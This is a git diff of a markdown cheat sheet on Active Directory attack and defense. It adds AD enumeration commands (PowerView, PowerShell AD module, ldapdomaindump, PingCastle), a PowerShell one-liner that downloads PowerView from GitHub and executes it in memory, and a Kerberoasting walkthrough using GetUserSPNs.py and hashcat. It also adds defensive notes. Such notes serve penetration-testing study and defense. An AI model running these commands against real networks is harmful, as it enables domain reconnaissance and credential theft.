@@ -2,6 +2,8 @@
 
 ## Quick References
 
+- [Active Directory Kill Chain Attack & Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
+
 ![Active Directory Introduction](https://i-technet.sec.s-msft.com/dynimg/IC196825.gif)
 > https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10)
 
@@ -23,6 +25,12 @@
 ![Structure](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images%5ccc759186.ccf65c10-edb1-4a3a-ad87-38775ee43b8a%28ws.10%29.gif)
 
 - Components
+  - **Schema** - Defines objects and attributes
+  - **Query and index mechanism** - Ability to search and publish objects and properties
+  - **Global Catalog** - Contains info about every object in directory
+  - **Replication Service** - Distributes information across domain controller
+- Structure 
+  - Forest - Security boundary, which may contain multiple `domains` and each domain may contain multiple `OU`s 
   - <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10)>
   - <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10)>
   - Organizational Units
@@ -58,11 +66,6 @@
     - Some of the objects located in: `NTDS Site Settings objects`, `subnet objects`, `connection objects`, `server objects`, and `site objects` (one site object for each site in the forest)
     - Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container
 
-- **Schema** - Defines objects and attributes
-- **Query and index mechanism** - Ability to search and publish objects and properties
-- **Global Catalog** - Contains info about every object in directory
-- **Replication Service** - Distributes information across domain controller
-
 - SYSVOL
   - Ref: [https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx)
   * Folder which resides on each and every [domain controller](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#Domain_Controller) within the [domain](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#Domain).
@@ -80,6 +83,14 @@
       * Instead of replicating entire files we only replicate the chunks of data that have changed
       * Based on [MD4](http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#MD4) hash of the file
   - `The log contains information about the file and the time it was changed, this is then used to build its change message. To ensure the file and all it’s attributes (i.e. permissions) are kept intact FRS calls the backup [API](http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#API)which uses [VSS](http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#VSS) technology to take a snapshot of the file and it’s attributes. This backup file is then compressed and stored in the staging area folder. At this point the outbound log is updated (again this is actually a table within the FRS database). This contains information about all the changes for a specified replication set. If in step 1 a file was deleted rather than created then we don’t create a staging file, but the outbound log reflects the deletion. FRS on DC1 then sends a change notification to its replication partner DC2. DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1. DC2 then copies the file from DC1 into its staging area. It then writes an entry to its outbound log to allow other partners to pickup the change. DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder. So there you have it, FRS replication. There is a very detailed and in-depth reference guide on TechNet[here](http://technet.microsoft.com/en-us/library/cc758169(v=WS.10).aspx) for further reference.`
+
+- Detect Firewall Blocking AD
+  - <https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/>
+  - PortQryUI - <http://www.microsoft.com/download/en/details.aspx?id=24009>
+  - Run the “Domains & Trusts” option between DCs, or between DCs and any machine
+  - “NOTLISTENING,” 0x00000001, and 0x00000002, that means there is a port block
+  - Can ignore UDP 389 and UDP 88 messages
+  - TCP 42 errors, that just means WINS is not running on the target server
 
 ### AD Trust Types
 
@@ -172,6 +183,13 @@ Install-ADDSForest -CreateDnsDelegation:$false ` -DatabasePath "C:\Windows\NTDS"
 ldapsearch -x -h $ip -p 389 -D 'SVC_TGS'​ -w ​$password -b ​ "dc=active,dc=htb"​ -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))"​ samaccountname
 ```
 
+### ldapdomaindump 
+
+```
+ldapdomaindump -u example\example 10.10.10.10
+```
+
+
 ### Impacket
 
 - GetADUsers.py - Enumerate domain user accounts
@@ -180,6 +198,15 @@ ldapsearch -x -h $ip -p 389 -D 'SVC_TGS'​ -w ​$password -b ​ "dc=active,dc
     ```
 
 ## Enumeration
+
+- Tips: 
+  - Run AD enumerations on each box you get access to.
+- Tools 
+  - Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): <https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be>
+  - Scan: 
+      ```
+      pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
+      ```
 
 ### Using PowerShell and Built-ins
 
@@ -194,25 +221,90 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 ```
 
 - Domain: `Get-ADDomain`
-- Forest: `Get-ADForest`
-- Trust: `Get-ADTrust -Filter *`
-- Users: `Get-ADUser -Filter *`
-- Groups : `Get-ADGroup -Filter *`
+- SID: `Get-DomainSID` = `Get-ADDomain.DomainSID.Value`
+- Domain Controller: `GET-ADDomainController`
+- Users: 
+  - `Get-ADUser -Filter *`
+  - `Get-ADUser -Filter * -Properties *`
+  - `Get-ADUser -Server pc1.powershell.local`
+  - `Get-ADUser -Identity labuser`
+- Groups : 
+  - `Get-ADGroup -Filter *`
+  - `Get-ADGroup -Filter * | Select Name`
+  - `Get-ADGroup -Filter {Name -like "*admin*"} | Select Name`
 - Filter Groups for User: `Get-ADGroup -Filter {Name -like "*admin*"} | select name, GroupScope`
+- Group Members:
+  - `Get-ADGroupMember -Identity "Domain Admins" -Recursive`
+  - `Get-AdPrincipalGroupMembership -Identity "labuser"`
+- Computers: `Get-AdComputer -Filter * -Properties *`
+- ACL for AD objects: (without resolving GUIDs)
+  - `(Get-Acl 'AD:\CN=labuser,CN=Users,DC=example,DC=powershell,DC=local').Access`
+- Trust
+  - `Get-AdTrust -Filter *`
+  - `Get-AdTrust -Filter * -Identify example.powershell.local`
+- Forest: 
+  - `Get-ADForest`
+  - `Get-ADForest -Identify powershell.local`
+  - Get all domains in current forest:
+    - `(Get-ADForest).Domains` 
+- Forest Trust
+  - `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`
 
 ### PowerView
 
 ```
 ./PowerView.ps1
 ```
-
-- All domain computers: `Get-NetComputer`
+- Current domain information: `Get-NetDomain`
+- Domain information: `Get-NetDomain -Domain powershell.local` (info of domains where there is a trust relationship)
 - Domain Controller: `Get-NetDomainController`
-- Groups: `Get-NetGroup`
-- Sessions: `Get-NetSession`
-- ACL for AD objects: `Get-ObjectAcl`
-- Check if current user context has local-admin access to hosts in the domain: `Find-LocalAdminAccess -Verbose`
-- Enumerate members of local-admin groups across all machines: `Invoke-EnumerateLocalAdmin -Verbose`
+- Users: 
+  - `Get-NetUser` 
+  - `Get-NetUser -Domain powershell.local` 
+  - `Get-NetUser -UserName labuser`
+- Groups: 
+  - `Get-NetGroup`
+  - `Get-NetGroup *admin*`
+- Group Members:
+  - `Get-NetGroupMembers -GroupName "Domain Admins"`
+  - `Get-NetGroup -UserName "labuser"`
+  - Check if current user context has local-admin access to hosts in the domain: `Find-LocalAdminAccess -Verbose`
+  - Enumerate members of local-admin groups across all machines: `Invoke-EnumerateLocalAdmin -Verbose`
+    - 2016+ responded only by boxes where current user have local-admin access
+- Computers: `Get-NetComputer -FullData`
+- Sessions: 
+  - `Get-NetSession`
+  - List sessions on a computer: `Get-NetSession -ComputerName pc1`
+  - Find computers where domain admin is logged in and current user has access: `Invoke-UserHunter -CheckAccess`
+    - Based on list of machines from DC
+    - List of sessions 
+    - Logged on users from each machine
+- Shares (?) 
+- ACL for AD objects: 
+  - `Get-ObjectAcl`
+  - `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs`
+  - `Get-ObjectACL -AdSprefix 'CN=Administrator,CN=Users' -Verbose`
+  - Look for  all interesting ACL entries: `Invoke-ACLScanner -ResolveGUIDs` (write modify)
+    - Filter using `IdentifyReference` to identify what current user has interesting access to
+- Trust
+  - `Get-NetDomainTrust`
+  - `Get-NetDomainTrust -Domain example.powershell.local`
+- Forest: 
+  - `Get-NetForest`
+  - `Get-NetForest -Forest powershell.local`
+  - Get all domains in current forest:
+    - `Get-NetForestDomain`
+    - `Get-NetForestDomain -Forest powershell.local`
+- Forest Trust
+  - `Get-NetForestTrust`
+  - `Get-NetForestTrust -Domain example.local`
+  
+```bash
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetDomain"
+```
+
+
+
 
 ### Snapshot for Offline Analysis
 
@@ -398,11 +490,31 @@ kerberos:ptt <ticket.kirbi>
 - Can be used to create silver tickets.   
 - If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this.
 
+### Microsoft Windows AD Kerberos Tickets
+
+- Gather tickets 
+    ```
+    GetUserSPNs.py -request (HOST.DOMAIN)/(VALID SMB USER):(USER PASSWORD)
+    ```
+- Crack
+    ```
+    -a 0 - Straight cracking mode
+    -m 13100 - Hashtype 13100 - which is Kerberos 5 TGS-REP etype 23
+    the kerberos.ticket file
+    -w 3 - Suggested example "workload" setting for Hashcat
+
+    .\hashcat64.exe -m 13100 -a 0 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\kerberos.tick
+    et' -w 3 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\rockyou.txt'
+    hashcat (v5.1.0) starting...
+    ```
+
 ## Defense 
 
 - Use unique and strong local admin account passwords
 - Use Microsoft LAPS to automate local admin password changes
 - KB2871997 to disallow local account logon across the network 
+  - <https://technet.microsoft.com/library/security/2871997>
+  - Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.
 - Limit workstation to workstation communication
 - Implement network segmentation
 - Never run services with domain-admin privileged accounts on workstations (avoid dumping from LSASS)
@@ -417,6 +529,8 @@ kerberos:ptt <ticket.kirbi>
   - Welcome to building your first domain controller!: <https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md>
 - Pwn and Defend - Active Directory Domain Enumeration: <https://www.youtube.com/watch?v=YxeXfHkHAUI&feature=youtu.be>
 - Implementing Least Privilege Model: <https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models>
+
+- `NetCease.ps1` to prevent session enumeration on AD computers 
 
 ## References
 
